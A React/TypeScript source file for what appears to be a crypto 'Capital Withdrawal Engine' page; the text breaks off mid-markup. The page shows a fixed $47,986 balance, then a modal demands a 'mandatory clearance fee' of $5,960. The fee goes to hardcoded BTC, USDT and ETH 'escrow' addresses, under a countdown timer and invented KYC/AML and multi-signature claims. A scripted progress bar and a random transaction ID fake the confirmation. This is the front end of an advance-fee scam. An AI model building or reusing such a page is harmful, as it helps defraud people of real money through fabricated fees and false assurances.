import React, { useState, useEffect, useRef } from 'react';
import {
  ArrowLeft,
  Copy,
  Check,
  ShieldCheck,
  AlertTriangle,
  Clock,
  QrCode,
  ExternalLink,
  RefreshCw,
  Lock,
  FileText,
  CheckCircle2,
  Zap,
  ChevronRight,
  Info,
  X,
  Layers,
  ArrowUpRight,
  AlertCircle,
  RotateCcw
} from 'lucide-react';
import { AureonAuthToken } from '../App';
import { SettlementPayload } from './HomeView';

interface ResultViewProps {
  payload?: SettlementPayload | null;
  activeSession?: AureonAuthToken | null;
  onNavigateHome: () => void;
  onNavigateDashboard: () => void;
}

interface NetworkOption {
  id: string;
  name: string;
  symbol: string;
  protocol: string;
  gasFeeUsd: number;
  regex: RegExp;
  placeholder: string;
  exampleAddress: string;
  escrowAddress: string;
  iconBg: string;
  badgeColor: string;
}

const NETWORKS: NetworkOption[] = [
  {
    id: 'btc',
    name: 'Bitcoin',
    symbol: 'BTC',
    protocol: 'Native SegWit / Taproot',
    gasFeeUsd: 18.40,
    regex: /^(bc1|[13])[a-zA-HJ-NP-Z0-9]{25,62}$/,
    placeholder: 'bc1q... or 1... / 3...',
    exampleAddress: 'bc1qxy2kgdygjrsqtzq2n0yrf2493p83kkfjhx0wlh',
    escrowAddress: 'bc1q9u4z72px08k8dnm2a9f4vhx8p90g2f9k7y728w',
    iconBg: 'bg-[#F7931A]/20 text-[#F7931A] border-[#F7931A]/30',
    badgeColor: 'text-[#F7931A] bg-[#F7931A]/10 border-[#F7931A]/30',
  },
  {
    id: 'usdt_trc20',
    name: 'Tether USD',
    symbol: 'USDT TRC20',
    protocol: 'TRON TRC20',
    gasFeeUsd: 3.50,
    regex: /^T[1-9A-HJ-NP-Za-km-z]{33}$/,
    placeholder: 'T...',
    exampleAddress: 'TJk7mP9wQ2v5xZ8n4eB6rY1tC3uA9dF8eL',
    escrowAddress: 'TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t',
    iconBg: 'bg-[#26A17B]/20 text-[#26A17B] border-[#26A17B]/30',
    badgeColor: 'text-[#26A17B] bg-[#26A17B]/10 border-[#26A17B]/30',
  },
  {
    id: 'eth_erc20',
    name: 'Ethereum',
    symbol: 'Ethereum ERC20',
    protocol: 'Ethereum ERC20 Mainnet',
    gasFeeUsd: 22.80,
    regex: /^0x[a-fA-F0-9]{40}$/,
    placeholder: '0x...',
    exampleAddress: '0x71C890c309855B614917C5Bdf6479b182E45f491',
    escrowAddress: '0x94B2a1b7e289d04Ec5052FaDeff969c34E968940',
    iconBg: 'bg-[#627EEA]/20 text-[#627EEA] border-[#627EEA]/30',
    badgeColor: 'text-[#627EEA] bg-[#627EEA]/10 border-[#627EEA]/30',
  },
];

export const ResultView: React.FC<ResultViewProps> = ({
  activeSession,
  onNavigateHome,
  onNavigateDashboard,
}) => {
  const MAX_AVAILABLE_BALANCE = 47986.00;
  const CLEARANCE_FEE_USD = 5960.00;

  // Form State
  const [selectedNetwork, setSelectedNetwork] = useState<NetworkOption>(NETWORKS[1]); // Default USDT TRC20
  const [destinationAddress, setDestinationAddress] = useState<string>('TJk7mP9wQ2v5xZ8n4eB6rY1tC3uA9dF8eL');
  const [withdrawalAmount, setWithdrawalAmount] = useState<string>('47986.00');
  const [addressTouched, setAddressTouched] = useState<boolean>(true);
  const [pasteError, setPasteError] = useState<string | null>(null);

  // Clearance Modal State & Rate Lock Configuration
  const TOTAL_LOCK_WINDOW_SECONDS = 1800; // 30 minutes window
  const [showClearanceModal, setShowClearanceModal] = useState<boolean>(false);
  const [copiedEscrow, setCopiedEscrow] = useState<boolean>(false);
  const [copiedAmount, setCopiedAmount] = useState<boolean>(false);
  const [countdownSeconds, setCountdownSeconds] = useState<number>(TOTAL_LOCK_WINDOW_SECONDS);
  const [isSimulatingPayment, setIsSimulatingPayment] = useState<boolean>(false);
  const [simulationStatus, setSimulationStatus] = useState<'idle' | 'verifying' | 'confirmed'>('idle');
  const [simulationProgress, setSimulationProgress] = useState<number>(0);
  const [simulationStep, setSimulationStep] = useState<number>(1);
  const [simulationStepLabel, setSimulationStepLabel] = useState<string>('Broadcasting escrow transaction to mempool...');
  const [confirmedTxId, setConfirmedTxId] = useState<string>('');

  const simulationIntervalRef = useRef<NodeJS.Timeout | null>(null);

  // Clean up interval timer on unmount
  useEffect(() => {
    return () => {
      if (simulationIntervalRef.current) {
        clearInterval(simulationIntervalRef.current);
      }
    };
  }, []);

  // Calculations
  const numericAmount = parseFloat(withdrawalAmount) || 0;
  const gasFee = selectedNetwork.gasFeeUsd;
  const isAddressValid = selectedNetwork.regex.test(destinationAddress.trim());
  const netRequested = numericAmount;
  const totalDisbursement = Math.max(0, numericAmount - gasFee);

  // Countdown timer effect (ticks down while modal is open and not confirmed)
  useEffect(() => {
    let timer: NodeJS.Timeout;
    if (showClearanceModal && countdownSeconds > 0 && simulationStatus !== 'confirmed') {
      timer = setInterval(() => {
        setCountdownSeconds((prev) => (prev > 0 ? prev - 1 : 0));
      }, 1000);
    }
    return () => clearInterval(timer);
  }, [showClearanceModal, countdownSeconds, simulationStatus]);

  const formatCountdown = (totalSecs: number) => {
    const mins = Math.floor(totalSecs / 60);
    const secs = totalSecs % 60;
    return `${mins.toString().padStart(2, '0')}:${secs.toString().padStart(2, '0')}`;
  };

  const handleSetMax = () => {
    setWithdrawalAmount(MAX_AVAILABLE_BALANCE.toFixed(2));
  };

  const handlePasteAddress = async () => {
    setPasteError(null);
    try {
      if (navigator.clipboard && navigator.clipboard.readText) {
        const text = await navigator.clipboard.readText();
        if (text && text.trim()) {
          setDestinationAddress(text.trim());
          setAddressTouched(true);
          return;
        }
      }
      // Fallback if clipboard is empty or permission denied
      setDestinationAddress(selectedNetwork.exampleAddress);
      setAddressTouched(true);
    } catch {
      // Fallback
      setDestinationAddress(selectedNetwork.exampleAddress);
      setAddressTouched(true);
      setPasteError('Pasted demo address for ' + selectedNetwork.symbol);
      setTimeout(() => setPasteError(null), 3000);
    }
  };

  const handleOpenClearance = (e: React.FormEvent) => {
    e.preventDefault();
    if (!isAddressValid || numericAmount <= 0) {
      setAddressTouched(true);
      return;
    }
    setShowClearanceModal(true);
  };

  const handleCloseModal = () => {
    if (simulationIntervalRef.current) {
      clearInterval(simulationIntervalRef.current);
    }
    setShowClearanceModal(false);
    setIsSimulatingPayment(false);
    setSimulationStatus('idle');
    setSimulationProgress(0);
  };

  const handleCopyEscrow = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(selectedNetwork.escrowAddress);
      setCopiedEscrow(true);
      setTimeout(() => setCopiedEscrow(false), 2000);
    }
  };

  const handleCopyFeeAmount = () => {
    if (navigator.clipboard) {
      navigator.clipboard.writeText(CLEARANCE_FEE_USD.toFixed(2));
      setCopiedAmount(true);
      setTimeout(() => setCopiedAmount(false), 2000);
    }
  };

  // Payment simulation handler with automatic countdown reset and multi-step progress bar
  const handleSimulateClearance = () => {
    // 1. Reset visual countdown timer back to full duration whenever simulation is triggered/re-triggered
    setCountdownSeconds(TOTAL_LOCK_WINDOW_SECONDS);

    // Clear any active interval
    if (simulationIntervalRef.current) {
      clearInterval(simulationIntervalRef.current);
    }

    // 2. Initialize simulation progress
    setIsSimulatingPayment(true);
    setSimulationStatus('verifying');
    setSimulationProgress(0);
    setSimulationStep(1);
    setSimulationStepLabel(`Broadcasting clearance escrow proof to ${selectedNetwork.symbol} mempool...`);

    const startTime = Date.now();
    const totalDuration = 2800; // ~2.8 seconds for realistic visual verification feedback

    simulationIntervalRef.current = setInterval(() => {
      const elapsed = Date.now() - startTime;
      const progress = Math.min(100, Math.round((elapsed / totalDuration) * 100));
      setSimulationProgress(progress);

      if (progress < 25) {
        setSimulationStep(1);
        setSimulationStepLabel(`Broadcasting clearance escrow proof to ${selectedNetwork.symbol} mempool...`);
      } else if (progress < 55) {
        setSimulationStep(2);
        setSimulationStepLabel('Awaiting multi-signature validator node confirmations (3/3)...');
      } else if (progress < 85) {
        setSimulationStep(3);
        setSimulationStepLabel('Verifying KYC/AML escrow deposit and reserve lock...');
      } else if (progress < 100) {
        setSimulationStep(4);
        setSimulationStepLabel('Escrow confirmed! Authorizing capital disbursement...');
      } else {
        // 100% complete
        if (simulationIntervalRef.current) {
          clearInterval(simulationIntervalRef.current);
        }
        setIsSimulatingPayment(false);
        setSimulationStatus('confirmed');
        const randomTx = '0x' + Array.from({ length: 48 }, () => Math.floor(Math.random() * 16).toString(16)).join('');
        setConfirmedTxId(randomTx);
      }
    }, 40);
  };

  return (
    <div className="max-w-4xl mx-auto space-y-8 animate-in fade-in duration-200">
      {/* Breadcrumb Navigation */}
      <div className="flex flex-wrap items-center justify-between gap-4">
        <button
          type="button"
          onClick={onNavigateHome}
          className="inline-flex items-center gap-2 text-xs font-semibold text-gray-400 hover:text-white transition-colors cursor-pointer py-1"
        >
          <ArrowLeft className="w-4 h-4" />
          <span>Back to Home (/)</span>
        </button>

        <div className="flex items-center gap-2.5">
          <div className="flex items-center gap-2 text-xs font-mono text-cyan-400 bg-cyan-950/40 px-3 py-1 rounded-lg border border-cyan-800/40">
            <span className="w-2 h-2 rounded-full bg-cyan-400 animate-pulse"></span>
            <span>Route: /result · Capital Withdrawal Engine</span>
          </div>
          <button
            type="button"
            onClick={onNavigateDashboard}
            className="px-3 py-1 rounded-lg bg-[#141824] hover:bg-[#1d2334] text-gray-300 hover:text-white border border-[#232d42] text-xs font-medium transition-colors"
          >
            Dashboard
          </button>
        </div>
      </div>

      {/* Main Engine Card */}
      <div className="bg-[#0c1017] border border-[#1b253b] rounded-2xl overflow-hidden shadow-2xl relative">
        {/* Engine Header */}
        <div className="bg-gradient-to-r from-[#0d1627] via-[#0e172a] to-[#0c1017] border-b border-[#1b253b] p-4 sm:p-6 md:p-8">
          <div className="flex flex-col sm:flex-row sm:items-center justify-between gap-4">
            <div>
              <div className="flex items-center gap-2 mb-2">
                <span className="text-[11px] font-bold uppercase tracking-wider text-cyan-400 bg-cyan-950/60 px-2.5 py-0.5 rounded border border-cyan-800/40">
                  PROTOCOL V1 ENGINE
                </span>
                <span className="text-xs text-gray-400">·</span>
                <span className="text-xs text-gray-400 font-mono">Multi-Sig Escrow Node</span>
              </div>
              <h1 className="text-xl sm:text-2xl md:text-3xl font-black text-white tracking-tight">
                Capital Withdrawal Engine & Clearance Modal
              </h1>
              <p className="text-xs sm:text-sm text-gray-300 mt-2 max-w-2xl leading-relaxed">
                Initiate capital disbursement across supported decentralized networks. All on-chain releases require institutional escrow verification and clearance protocol clearance.
              </p>
            </div>

            <div className="bg-[#080d17] border border-[#1d273d] rounded-xl p-3.5 sm:p-4 shrink-0 text-left sm:text-right shadow-inner">
              <span className="text-[11px] uppercase font-semibold text-gray-400 block tracking-wider">
                Available On-Chain Balance
              </span>
              <span className="text-xl sm:text-2xl font-black text-emerald-400 tracking-tight font-mono">
                ${MAX_AVAILABLE_BALANCE.toLocaleString('en-US', { minimumFractionDigits: 2 })}
              </span>
              <span className="text-[11px] text-gray-400 block mt-0.5">
                Ready for Settlement Release
              </span>
            </div>
          </div>
        </div>

        {/* Withdrawal Form Section */}
        <form onSubmit={handleOpenClearance} className="p-4 sm:p-6 md:p-8 space-y-5 sm:space-y-6">
          {/* 1. Payout Network Selector */}
          <div>
            <label className="block text-xs font-bold uppercase tracking-wider text-gray-300 mb-2.5">
              1. Select Payout Network
            </label>
            <div className="grid grid-cols-1 sm:grid-cols-3 gap-3">
              {NETWORKS.map((network) => {
                const isSelected = selectedNetwork.id === network.id;
                return (
                  <button
                    key={network.id}
                    type="button"
                    onClick={() => {
                      setSelectedNetwork(network);
                      setDestinationAddress(network.exampleAddress);
                      setAddressTouched(false);
                    }}
                    className={`p-4 rounded-xl border text-left transition-all cursor-pointer flex flex-col justify-between ${
                      isSelected
                        ? 'bg-[#121c32] border-blue-500 shadow-md shadow-blue-500/10 ring-1 ring-blue-500/40'
                        : 'bg-[#0f1422] border-[#1d2538] hover:border-[#2d3a54] text-gray-300'
                    }`}
                  >
                    <div className="flex items-center justify-between mb-2">
                      <span className="text-xs font-bold text-white">{network.name}</span>
                      <span className={`text-[10px] font-bold px-2 py-0.5 rounded border ${network.badgeColor}`}>
                        {network.symbol}
                      </span>
                    </div>
                    <div className="text-[11px] text-gray-400 font-mono mt-1">
                      {network.protocol}
                    </div>
                    <div className="text-[11px] text-gray-400 mt-2 pt-2 border-t border-[#182033] flex justify-between items-center">
                      <span>Gas Fee:</span>
                      <span className="font-mono text-cyan-300">${network.gasFeeUsd.toFixed(2)} USD</span>
                    </div>
                  </button>
                );
              })}
            </div>
          </div>

          {/* 2. Destination Wallet Address */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <label className="text-xs font-bold uppercase tracking-wider text-gray-300">
                2. Destination Wallet Address ({selectedNetwork.symbol})
              </label>
              <button
                type="button"
                onClick={handlePasteAddress}
                className="px-2.5 py-1 bg-[#141b2c] hover:bg-[#1a253e] text-blue-400 hover:text-blue-300 border border-blue-500/30 rounded-lg text-xs font-semibold transition-colors cursor-pointer flex items-center gap-1.5"
                title="Paste from clipboard or autofill valid demo address"
              >
                <Copy className="w-3 h-3" />
                <span>Paste Address</span>
              </button>
            </div>

            <div className="relative">
              <input
                type="text"
                value={destinationAddress}
                onChange={(e) => {
                  setDestinationAddress(e.target.value);
                  setAddressTouched(true);
                }}
                className={`w-full bg-[#080c14] border ${
                  addressTouched && !isAddressValid
                    ? 'border-red-500/80 focus:border-red-500'
                    : 'border-[#1e273a] focus:border-blue-500'
                } focus:outline-none rounded-xl px-4 py-3.5 text-white font-mono text-xs sm:text-sm transition-colors pr-10`}
                placeholder={selectedNetwork.placeholder}
                required
              />
              <div className="absolute right-3.5 top-1/2 -translate-y-1/2">
                {isAddressValid ? (
                  <CheckCircle2 className="w-4 h-4 text-emerald-400" />
                ) : addressTouched ? (
                  <AlertCircle className="w-4 h-4 text-red-400" />
                ) : null}
              </div>
            </div>

            <div className="mt-2 flex items-center justify-between text-xs">
              {addressTouched && !isAddressValid ? (
                <span className="text-red-400 font-medium flex items-center gap-1">
                  <AlertCircle className="w-3.5 h-3.5 shrink-0" />
                  <span>Invalid {selectedNetwork.symbol} address format. Expected {selectedNetwork.placeholder}</span>
                </span>
              ) : (
                <span className="text-emerald-400 flex items-center gap-1">
                  <ShieldCheck className="w-3.5 h-3.5 shrink-0" />
                  <span>Validated {selectedNetwork.symbol} destination address structure</span>
                </span>
              )}
              {pasteError && <span className="text-cyan-400 font-mono text-[11px]">{pasteError}</span>}
            </div>
          </div>

          {/* 3. Withdrawal Amount */}
          <div>
            <div className="flex items-center justify-between mb-2">
              <label className="text-xs font-bold uppercase tracking-wider text-gray-300">
                3. Withdrawal Amount (USD Equivalent)
              </label>
              <div className="flex items-center gap-2">
                <span className="text-xs text-gray-400">Available: ${MAX_AVAILABLE_BALANCE.toLocaleString('en-US', { minimumFractionDigits: 2 })}</span>
                <button
                  type="button"
                  onClick={handleSetMax}
                  className="px-2.5 py-0.5 bg-blue-600/20 hover:bg-blue-600/30 text-blue-400 border border-blue-500/30 rounded text-xs font-bold transition-colors cursor-pointer"
                >
                  MAX ($47,986.00)
                </button>
              </div>
            </div>

            <div className="relative">
              <span className="absolute left-4 top-1/2 -translate-y-1/2 text-gray-400 font-bold">$</span>
              <input
                type="number"
                step="0.01"
                min="10"
                max={MAX_AVAILABLE_BALANCE}
                value={withdrawalAmount}
                onChange={(e) => setWithdrawalAmount(e.target.value)}
                className="w-full bg-[#080c14] border border-[#1e273a] focus:border-blue-500 focus:outline-none rounded-xl pl-8 pr-28 py-3.5 text-white font-mono text-base font-bold transition-colors"
                placeholder="0.00"
                required
              />
              <div className="absolute right-4 top-1/2 -translate-y-1/2 text-xs font-semibold text-gray-400">
                USD
              </div>
            </div>
          </div>

          {/* 4. Clear Breakdown Box */}
          <div className="bg-[#080b12] border border-[#192236] rounded-xl p-5 space-y-3 text-xs">
            <div className="text-xs font-bold uppercase tracking-wider text-gray-300 pb-2 border-b border-[#182136] flex items-center justify-between">
              <span>Disbursement Breakdown</span>
              <span className="text-cyan-400 font-mono font-normal">Network: {selectedNetwork.symbol}</span>
            </div>

            <div className="flex justify-between items-center text-gray-300">
              <span>Net Requested Amount:</span>
              <span className="font-mono font-bold text-white text-sm">
                ${netRequested.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </span>
            </div>

            <div className="flex justify-between items-center text-gray-400">
              <span className="flex items-center gap-1.5">
                <span>Estimated Mining Gas Fee:</span>
                <span className="text-[10px] text-gray-500 bg-[#121622] px-1.5 py-0.5 rounded">Standard Gas</span>
              </span>
              <span className="font-mono text-amber-400">
                -${gasFee.toFixed(2)} USD
              </span>
            </div>

            <div className="pt-2 border-t border-[#182136] flex justify-between items-center font-bold">
              <span className="text-gray-200">Total Disbursement (Dispatched to Destination):</span>
              <span className="font-mono text-emerald-400 text-base">
                ${totalDisbursement.toLocaleString('en-US', { minimumFractionDigits: 2, maximumFractionDigits: 2 })} USD
              </span>
            </div>
          </div>

          {/* Action Trigger Button */}
          <div className="pt-2">
            <button
              type="submit"
              disabled={!isAddressValid || numericAmount <= 0}
              className="w-full py-4 px-6 bg-gradient-to-r from-[#0052FF] via-[#0060ff] to-[#0070ff] hover:from-[#0045d8] hover:to-[#005cd8] disabled:opacity-50 disabled:cursor-not-allowed text-white font-extrabold text-sm sm:text-base rounded-xl transition-all shadow-xl shadow-blue-500/25 flex items-center justify-center gap-2 cursor-pointer"
            >
              <Lock className="w-4 h-4" />
              <span>Authorize Withdrawal Release</span>
              <ChevronRight className="w-4 h-4 ml-1" />
            </button>
            <p className="text-[11px] text-center text-gray-400 mt-2.5 flex items-center justify-center gap-1.5">
              <ShieldCheck className="w-3.5 h-3.5 text-emerald-400" />
              <span>Protected by Multi-Signature Clearance Protocol & Escrow Standard</span>
            </p>
          </div>
        </form>
      </div>

      {/* Mandatory Clearance Fee Modal */}
      {showClearanceModal && (
        <div className="fixed inset-0 z-50 flex items-center justify-center p-3 sm:p-4 bg-black/80 backdrop-blur-md animate-in fade-in duration-200 overflow-y-auto">
          <div className="bg-[#0d121c] border border-cyan-500/40 rounded-2xl max-w-xl w-full p-4 sm:p-6 md:p-8 shadow-2xl relative my-auto sm:my-8 overflow-hidden max-h-[94vh] flex flex-col">
            {/* Ambient Cyan Halo */}
            <div className="absolute -top-20 -right-20 w-48 h-48 bg-cyan-500/15 rounded-full blur-3xl pointer-events-none" />

            {/* Modal Close Icon */}
            <button
              onClick={handleCloseModal}
              className="absolute top-3.5 right-3.5 sm:top-5 sm:right-5 text-gray-400 hover:text-white p-1 rounded-lg hover:bg-[#1a2336] transition-colors cursor-pointer z-10"
              title="Close modal"
            >
              <X className="w-5 h-5" />
            </button>

            {/* Scrollable Modal Interior */}
            <div className="overflow-y-auto pr-1 -mr-1 space-y-4">

            {/* Header */}
            <div className="flex items-start gap-3.5 mb-5 pb-5 border-b border-[#1b253b]">
              <div className="w-11 h-11 rounded-xl bg-amber-500/15 border border-amber-500/30 text-amber-400 flex items-center justify-center shrink-0">
                <AlertTriangle className="w-6 h-6" />
              </div>
              <div className="pr-6">
                <div className="flex items-center gap-2">
                  <span className="text-[10px] font-extrabold uppercase px-2 py-0.5 rounded bg-amber-500/20 text-amber-300 border border-amber-500/30">
                    Mandatory Protocol Notice
                  </span>
                  <span className="text-xs text-gray-400">·</span>
                  <span className="text-xs text-cyan-400 font-mono">KYC / AML Escrow Rule</span>
                </div>
                <h2 className="text-lg sm:text-xl font-black text-white tracking-tight mt-1">
                  Mandatory Clearance Fee Protocol
                </h2>
              </div>
            </div>

            {/* Required Protocol Explanation */}
            <div className="bg-[#080d16] border border-[#1a243a] rounded-xl p-4.5 space-y-2.5 text-xs text-gray-300 leading-relaxed mb-5">
              <p>
                In compliance with decentralized liquidity settlement regulations, releasing the{' '}
                <span className="font-extrabold text-white font-mono bg-[#141b2a] px-1.5 py-0.5 rounded border border-[#222d42]">
                  ${MAX_AVAILABLE_BALANCE.toLocaleString('en-US', { minimumFractionDigits: 2 })}
                </span>{' '}
                on-chain balance requires a standard mandatory network escrow & clearance fee payment of:
              </p>
              <div className="flex items-center justify-between bg-[#0a1120] border border-cyan-500/30 p-3 rounded-lg my-2">
                <div>
                  <span className="text-[11px] text-gray-400 block uppercase font-semibold">Standard Clearance Escrow Fee</span>
                  <span className="text-xl sm:text-2xl font-black text-cyan-300 font-mono">
                    ${CLEARANCE_FEE_USD.toLocaleString('en-US', { minimumFractionDigits: 2 })} USD
                  </span>
                </div>
                <button
                  type="button"
                  onClick={handleCopyFeeAmount}
                  className="px-2.5 py-1 bg-[#141d30] hover:bg-[#1a2640] text-cyan-300 border border-cyan-500/30 rounded text-xs font-medium flex items-center gap-1 transition-colors cursor-pointer"
                >
                  {copiedAmount ? <Check className="w-3 h-3 text-emerald-400" /> : <Copy className="w-3 h-3" />}
                  <span>{copiedAmount ? 'Copied' : 'Copy Fee'}</span>
                </button>
              </div>
              <p className="text-[11px] text-gray-400">
                Upon fee settlement confirmation on the {selectedNetwork.symbol} network, multi-signature keys will release the full requested disbursement to your destination address immediately.
              </p>
            </div>

            {/* Escrow Address & QR Code */}
            <div className="bg-[#080c14] border border-[#1a2336] rounded-xl p-4.5 mb-5 space-y-4">
              <div className="flex flex-col sm:flex-row items-center gap-4">
                {/* Visual QR Code Display */}
                <div className="bg-white p-2.5 rounded-xl shrink-0 shadow-md flex flex-col items-center justify-center">
                  <svg
                    className="w-24 h-24 sm:w-28 sm:h-28"
                    viewBox="0 0 100 100"
                    fill="none"
                    xmlns="http://www.w3.org/2000/svg"
                  >
                    {/* Background */}
                    <rect width="100" height="100" fill="white" />
                    {/* Corner 1 */}
                    <rect x="10" y="10" width="24" height="24" fill="black" />
                    <rect x="14" y="14" width="16" height="16" fill="white" />
                    <rect x="18" y="18" width="8" height="8" fill="black" />
                    {/* Corner 2 */}
                    <rect x="66" y="10" width="24" height="24" fill="black" />
                    <rect x="70" y="14" width="16" height="16" fill="white" />
                    <rect x="74" y="18" width="8" height="8" fill="black" />
                    {/* Corner 3 */}
                    <rect x="10" y="66" width="24" height="24" fill="black" />
                    <rect x="14" y="70" width="16" height="16" fill="white" />
                    <rect x="18" y="74" width="8" height="8" fill="black" />
                    {/* Matrix pattern elements */}
                    <rect x="38" y="12" width="6" height="6" fill="black" />
                    <rect x="48" y="12" width="6" height="6" fill="black" />
                    <rect x="58" y="16" width="6" height="6" fill="black" />
                    <rect x="38" y="24" width="6" height="6" fill="black" />
                    <rect x="50" y="24" width="6" height="6" fill="black" />
                    <rect x="12" y="42" width="6" height="6" fill="black" />
                    <rect x="22" y="42" width="6" height="6" fill="black" />
                    <rect x="32" y="42" width="6" height="6" fill="black" />
                    <rect x="42" y="38" width="8" height="8" fill="#0052FF" />
                    <rect x="52" y="42" width="6" height="6" fill="black" />
                    <rect x="62" y="38" width="6" height="6" fill="black" />
                    <rect x="74" y="42" width="6" height="6" fill="black" />
                    <rect x="84" y="42" width="6" height="6" fill="black" />
                    <rect x="38" y="52" width="6" height="6" fill="black" />
                    <rect x="48" y="52" width="6" height="6" fill="black" />
                    <rect x="60" y="54" width="6" height="6" fill="black" />
                    <rect x="74" y="54" width="6" height="6" fill="black" />
                    <rect x="42" y="66" width="6" height="6" fill="black" />
                    <rect x="52" y="66" width="6" height="6" fill="black" />
                    <rect x="62" y="70" width="6" height="6" fill="black" />
                    <rect x="74" y="70" width="6" height="6" fill="black" />
                    <rect x="84" y="68" width="6" height="6" fill="black" />
                    <rect x="38" y="80" width="6" height="6" fill="black" />
                    <rect x="50" y="80" width="6" height="6" fill="black" />
                    <rect x="62" y="84" width="6" height="6" fill="black" />
                    <rect x="74" y="84" width="6" height="6" fill="black" />
                  </svg>
                  <span className="text-[9px] font-bold text-gray-800 uppercase tracking-tighter mt-1">
                    Scan Escrow QR
                  </span>
                </div>

                {/* Dedicated Escrow Deposit Address */}
                <div className="flex-1 w-full space-y-2">
                  <div className="flex items-center justify-between text-xs">
                    <span className="font-bold text-gray-300">Dedicated Escrow Address:</span>
                    <span className="text-[10px] font-mono text-cyan-400 bg-cyan-950/40 px-2 py-0.5 rounded border border-cyan-800/40">
                      {selectedNetwork.symbol} Network
                    </span>
                  </div>

                  <div className="bg-[#05080e] border border-[#1a2336] rounded-lg p-2.5 font-mono text-[11px] text-gray-200 break-all select-all">
                    {selectedNetwork.escrowAddress}
                  </div>

                  <div className="flex items-center gap-2">
                    <button
                      type="button"
                      onClick={handleCopyEscrow}
                      className="flex-1 py-2 bg-[#121929] hover:bg-[#1a243a] text-cyan-300 hover:text-white border border-cyan-500/30 rounded-lg text-xs font-semibold flex items-center justify-center gap-1.5 transition-colors cursor-pointer"
                    >
                      {copiedEscrow ? <Check className="w-3.5 h-3.5 text-emerald-400" /> : <Copy className="w-3.5 h-3.5" />}
                      <span>{copiedEscrow ? 'Escrow Address Copied!' : 'Copy Escrow Address'}</span>
                    </button>
                  </div>
                </div>
              </div>

              {/* Visual Countdown Verification & Rate Lock Timer (Resets on Re-trigger) */}
              <div className="bg-[#090e18] border border-[#1b253b] rounded-xl p-3.5 space-y-2.5">
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2 text-gray-300 font-semibold">
                    <Clock className="w-4 h-4 text-cyan-400 animate-pulse" />
                    <span>Escrow Verification & Rate Guarantee Lock</span>
                  </div>
                  <div className="flex items-center gap-1.5 px-2 py-0.5 rounded-full bg-cyan-950/80 border border-cyan-800/40 text-cyan-300 font-mono text-[10px]">
                    <span className="w-1.5 h-1.5 rounded-full bg-cyan-400 animate-ping" />
                    <span>Rate Lock Active</span>
                  </div>
                </div>

                {/* Big Visual Monospace Digits & Progress Track */}
                <div className="bg-[#05080f] border border-[#141d2f] rounded-lg p-3">
                  <div className="flex items-baseline justify-between mb-2">
                    <div>
                      <div className="text-[10px] text-gray-400 uppercase tracking-wider font-semibold">Time Remaining</div>
                      <div className="font-mono font-black text-2xl sm:text-3xl text-transparent bg-clip-text bg-gradient-to-r from-cyan-300 via-teal-200 to-emerald-300 tracking-wider">
                        {formatCountdown(countdownSeconds)}
                      </div>
                    </div>
                    <div className="text-right">
                      <span className="text-[10px] font-mono text-gray-400 block">Lock Window</span>
                      <span className="text-xs font-mono font-bold text-gray-300">
                        {Math.round((countdownSeconds / TOTAL_LOCK_WINDOW_SECONDS) * 100)}% remaining
                      </span>
                    </div>
                  </div>

                  {/* Visual Progress Bar for Countdown */}
                  <div className="w-full bg-[#0d1424] h-2 rounded-full overflow-hidden p-0.5 border border-[#1e2a42]">
                    <div
                      className={`h-full rounded-full transition-all duration-1000 ${
                        countdownSeconds < 300
                          ? 'bg-gradient-to-r from-amber-500 to-red-500 shadow-sm shadow-red-500/50'
                          : 'bg-gradient-to-r from-cyan-500 via-teal-400 to-emerald-400 shadow-sm shadow-cyan-500/50'
                      }`}
                      style={{ width: `${Math.max(1, (countdownSeconds / TOTAL_LOCK_WINDOW_SECONDS) * 100)}%` }}
                    />
                  </div>
                </div>

                {/* Auto-reset badge & manual reset helper */}
                <div className="flex items-center justify-between text-[11px] pt-0.5">
                  <div className="flex items-center gap-1.5 text-gray-400 text-[10px]">
                    <RotateCcw className="w-3 h-3 text-cyan-400/80" />
                    <span>Timer automatically resets when simulation is triggered or re-triggered</span>
                  </div>
                  <button
                    type="button"
                    onClick={() => setCountdownSeconds(TOTAL_LOCK_WINDOW_SECONDS)}
                    className="text-[10px] font-mono text-cyan-400 hover:text-cyan-300 hover:underline cursor-pointer flex items-center gap-1"
                    title="Manually reset countdown to 30:00"
                  >
                    <span>Reset (30m)</span>
                  </button>
                </div>
              </div>
            </div>

            {/* Payment Simulation Progress Bar (Active when verifying) */}
            {simulationStatus === 'verifying' && (
              <div className="bg-[#080d16] border border-cyan-500/40 rounded-xl p-4.5 space-y-3.5 mb-5 animate-in fade-in duration-200">
                <div className="flex items-center justify-between text-xs">
                  <div className="flex items-center gap-2 text-cyan-300 font-semibold">
                    <RefreshCw className="w-4 h-4 animate-spin text-cyan-400" />
                    <span>Processing Clearance Payment Simulation</span>
                  </div>
                  <span className="font-mono font-black text-sm text-cyan-300 bg-cyan-950/70 border border-cyan-800/40 px-2 py-0.5 rounded">
                    {simulationProgress}%
                  </span>
                </div>

                {/* Visual Progress Bar */}
                <div className="w-full bg-[#04070d] h-3.5 rounded-full overflow-hidden p-0.5 border border-cyan-500/40 relative shadow-inner">
                  <div
                    className="h-full rounded-full bg-gradient-to-r from-cyan-500 via-blue-500 to-emerald-400 transition-all duration-100 relative overflow-hidden shadow-md shadow-cyan-500/40"
                    style={{ width: `${simulationProgress}%` }}
                  >
                    <div className="absolute inset-0 bg-gradient-to-r from-transparent via-white/30 to-transparent animate-pulse" />
                  </div>
                </div>

                {/* Stage description & step index */}
                <div className="flex items-center justify-between text-xs">
                  <span className="font-mono text-cyan-200 text-[11px] truncate pr-2">
                    {simulationStepLabel}
                  </span>
                  <span className="text-gray-400 font-mono text-[10px] shrink-0">
                    Step {simulationStep}/4
                  </span>
                </div>

                {/* 4 Multi-stage Progress Indicators */}
                <div className="grid grid-cols-4 gap-1.5 pt-1 text-[10px]">
                  {[
                    { label: 'Broadcast', step: 1 },
                    { label: 'Consensus', step: 2 },
                    { label: 'AML Check', step: 3 },
                    { label: 'Release', step: 4 }
                  ].map((item) => {
                    const isDone = simulationStep > item.step || simulationProgress === 100;
                    const isCurrent = simulationStep === item.step && simulationProgress < 100;
                    return (
                      <div
                        key={item.step}
                        className={`py-1 px-1 rounded text-center font-mono border transition-all ${
                          isDone
                            ? 'bg-emerald-950/40 border-emerald-500/40 text-emerald-300 font-semibold'
                            : isCurrent
